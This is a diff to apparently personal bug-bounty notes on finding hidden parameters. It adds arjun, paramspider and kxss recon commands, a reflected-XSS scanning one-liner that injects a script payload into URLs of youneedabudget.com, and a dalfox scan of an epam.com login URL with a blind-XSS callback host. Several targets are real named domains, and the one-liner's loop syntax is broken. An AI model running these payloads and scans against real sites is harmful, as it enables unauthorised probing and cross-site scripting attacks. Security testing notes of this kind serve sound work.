@@ -1035,9 +1035,19 @@ ssti
 Hidden params
 1- 	Gather all urls => wayback , gau , hackcrawler , 
 	Arjun => https://github.com/s0md3v/Arjun
-2- param miner	=> burpsuite
-3- check url as => https://www.google.com?hidden_param=value
+	- arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
+2- paramspider
+	- python3 paramspider.py --domain indrive.com
+	- python3 paramspider.py --domain https://cpcalendars.cartscity.com --exclude woff,css,js,png,svg,php,jpg --output file.txt
+	- cat params.txt | kxss
+3- param miner	=> burpsuite
+4- check url as => https://www.google.com?hidden_param=value
 
+- waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do
+; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host
+\033[0;31mVulnerable\n";done
+- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code
+https://hahwul.xss.ht
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 SQLI 
